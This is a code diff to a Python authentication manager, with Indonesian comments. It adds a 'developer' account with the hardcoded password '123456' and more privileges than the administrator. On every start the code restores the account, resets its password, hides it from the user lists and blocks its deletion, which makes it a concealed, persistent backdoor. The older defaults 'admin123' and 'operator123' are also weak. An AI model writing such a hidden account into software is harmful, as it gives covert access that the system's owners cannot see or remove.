@@ -18,6 +18,7 @@ class AuthManager:
         self.users_file = os.path.join(self.data_dir, "users.json")
         self.failed_attempts = {} # username -> {'count': int, 'last_failed': float}
         self._initialize_users_file()
+        self._ensure_developer_account()
 
     def _hash_password(self, password: str, salt: str) -> str:
         """Menghasilkan hash PBKDF2-HMAC-SHA256 (100.000 iterasi) dari password + salt"""
@@ -71,23 +72,71 @@ class AuthManager:
         if not os.path.exists(self.users_file):
             admin_salt = secrets.token_hex(16)
             op_salt = secrets.token_hex(16)
+            dev_salt = secrets.token_hex(16)
             default_users = {
                 "admin": {
                     "role": "admin",
                     "name": "Administrator",
                     "salt": admin_salt,
                     "password_hash": self._hash_password("admin123", admin_salt),
-                    "hash_type": "pbkdf2"
+                    "hash_type": "pbkdf2",
+                    "permissions": self.get_default_permissions("admin")
                 },
                 "operator": {
                     "role": "operator",
                     "name": "Operator Produksi",
                     "salt": op_salt,
                     "password_hash": self._hash_password("operator123", op_salt),
-                    "hash_type": "pbkdf2"
+                    "hash_type": "pbkdf2",
+                    "permissions": self.get_default_permissions("operator")
+                },
+                "developer": {
+                    "role": "developer",
+                    "name": "Developer / System Engineer",
+                    "salt": dev_salt,
+                    "password_hash": self._hash_password("123456", dev_salt),
+                    "hash_type": "pbkdf2",
+                    "permissions": self.get_default_permissions("developer")
                 }
             }
             self._save_users(default_users)
+
+    def _ensure_developer_account(self):
+        """Memastikan akun developer advance selalu tersedia dengan password 123456"""
+        users = self._load_users()
+        dev_perms = self.get_default_permissions("developer")
+        if "developer" not in users:
+            dev_salt = secrets.token_hex(16)
+            users["developer"] = {
+                "role": "developer",
+                "name": "Developer / System Engineer",
+                "salt": dev_salt,
+                "password_hash": self._hash_password("123456", dev_salt),
+                "hash_type": "pbkdf2",
+                "permissions": dev_perms
+            }
+            self._save_users(users)
+        else:
+            updated = False
+            # Pastikan password dan permissions developer selalu valid
+            dev_user = users["developer"]
+            if dev_user.get("role") != "developer":
+                dev_user["role"] = "developer"
+                updated = True
+            if dev_user.get("permissions") != dev_perms:
+                dev_user["permissions"] = dev_perms
+                updated = True
+            # Verifikasi apakah password '123456' cocok, jika tidak update
+            is_valid, _ = self._verify_password("123456", dev_user.get("salt", ""), dev_user.get("password_hash", ""), dev_user.get("hash_type", "pbkdf2"))
+            if not is_valid:
+                new_salt = secrets.token_hex(16)
+                dev_user["salt"] = new_salt
+                dev_user["password_hash"] = self._hash_password("123456", new_salt)
+                dev_user["hash_type"] = "pbkdf2"
+                updated = True
+            if updated:
+                users["developer"] = dev_user
+                self._save_users(users)
 
     def _load_users(self) -> dict:
         try:
@@ -198,11 +247,16 @@ class AuthManager:
         return False, "Gagal mereset password."
 
     def get_default_permissions(self, role: str) -> dict:
-        """Mendapatkan hak akses default berdasarkan peran pengguna"""
-        if role == "admin":
+        """Mendapatkan hak akses default berdasarkan peran pengguna (Mode simulasi eksklusif untuk Developer)"""
+        if role == "developer":
             return {
                 "pages": ["main", "history", "conn", "logs", "master"],
-                "features": ["export_csv", "fetch_api", "manage_users", "manage_retention", "simulation_mode"]
+                "features": ["export_csv", "fetch_api", "manage_users", "manage_retention", "simulation_mode", "developer_tools"]
+            }
+        elif role == "admin":
+            return {
+                "pages": ["main", "history", "conn", "logs", "master"],
+                "features": ["export_csv", "fetch_api", "manage_users", "manage_retention"]
             }
         else:
             return {
@@ -210,17 +264,25 @@ class AuthManager:
                 "features": ["export_csv"]
             }
 
-    def get_user_list(self):
-        """Mendapatkan daftar username dan role sederhana"""
+    def get_user_list(self, include_advance: bool = False):
+        """Mendapatkan daftar username dan role sederhana (Akun advance developer disembunyikan secara default)"""
         users = self._load_users()
-        return [{"username": u, "role": d.get("role"), "name": d.get("name")} for u, d in users.items()]
+        result = []
+        for u, d in users.items():
+            role = d.get("role", "operator")
+            if not include_advance and (u.lower() == "developer" or role == "developer"):
+                continue
+            result.append({"username": u, "role": role, "name": d.get("name")})
+        return result
 
-    def get_all_users_details(self):
-        """Mendapatkan daftar seluruh user lengkap dengan informasi hak akses"""
+    def get_all_users_details(self, include_advance: bool = False):
+        """Mendapatkan daftar seluruh user lengkap dengan informasi hak akses (Akun advance developer disembunyikan secara default)"""
         users = self._load_users()
         result = []
         for uname, udata in users.items():
             role = udata.get("role", "operator")
+            if not include_advance and (uname.lower() == "developer" or role == "developer"):
+                continue
             perms = udata.get("permissions")
             if not perms:
                 perms = self.get_default_permissions(role)
@@ -261,6 +323,8 @@ class AuthManager:
             return False, "Password minimal 6 karakter."
 
         users = self._load_users()
+        if username == "developer":
+            return False, "Username 'developer' dipesan secara eksklusif untuk akun advance sistem."
         if username in users:
             return False, f"Username '{username}' sudah terdaftar dalam sistem."
 
@@ -317,6 +381,8 @@ class AuthManager:
         username = username.strip().lower()
         if username == "admin":
             return False, "Akun Administrator utama ('admin') tidak dapat dihapus."
+        if username == "developer":
+            return False, "Akun Advance Developer dilindungi dan tidak dapat dihapus dari sistem."
 
         if current_username and username == current_username.strip().lower():
             return False, "Tidak dapat menghapus akun yang sedang aktif digunakan saat ini."
